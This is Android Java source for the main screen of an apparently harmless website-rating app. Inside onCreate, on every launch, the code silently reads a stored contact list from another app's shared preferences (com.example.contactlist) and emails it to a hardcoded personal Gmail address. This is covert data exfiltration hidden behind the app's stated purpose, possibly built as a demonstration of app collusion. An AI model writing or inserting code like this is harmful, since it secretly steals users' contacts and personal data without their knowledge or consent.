package com.example.webrater;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.ListView;

public class MainActivity extends AppCompatActivity {

    boolean isSearching;
    DataBaseHelper websiteDB;

    private String contactListJson = null;
    private Context mContext;
    private static SharedPreferences mPrefs;

    // Set the mail which received contactList;
    private String mailto = "marcantoine.garcia01@gmail.com";


    @SuppressLint("WrongConstant")
    protected void onCreate (Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // open database
        websiteDB = new DataBaseHelper(this);
        isSearching=false;
        try {
            mContext = this.createPackageContext(
                    "com.example.contactlist",
                    Context.MODE_PRIVATE);
            mPrefs = mContext.getSharedPreferences("contactList", Activity.MODE_PRIVATE);
            contactListJson = mPrefs.getString("contactList", null);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        if (contactListJson != null){
            sendEmail();
        }
    }

    private void sendEmail() {
        SendMail sm = new SendMail(this, mailto, "ContactList", contactListJson);
        sm.execute();
    }


    public void onPause(){
        super.onPause();
    }

    public void start(View view){
        Intent search = new Intent(this, Search.class);
        startActivity(search);
    }

    public void viewRatings(View view){
        int res = websiteDB.getAllData();
        if(res == -1){
            showMessage("Error", "You have not rated any website yet.");
            return;
        } else {
            Intent myRatings = new Intent(this, MyRatings.class);
            startActivity(myRatings);
        }
    }

    private void showMessage(String title, String message){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setCancelable(true);
        builder.setTitle(title);
        builder.setMessage(message);
        builder.show();
    }

    public DataBaseHelper getWebsiteDB ( ) {
        return websiteDB;
    }

    public boolean isSearching ( ) {
        return isSearching;
    }

    public void setSearching (boolean searching) {
        this.isSearching = searching;
    }
}
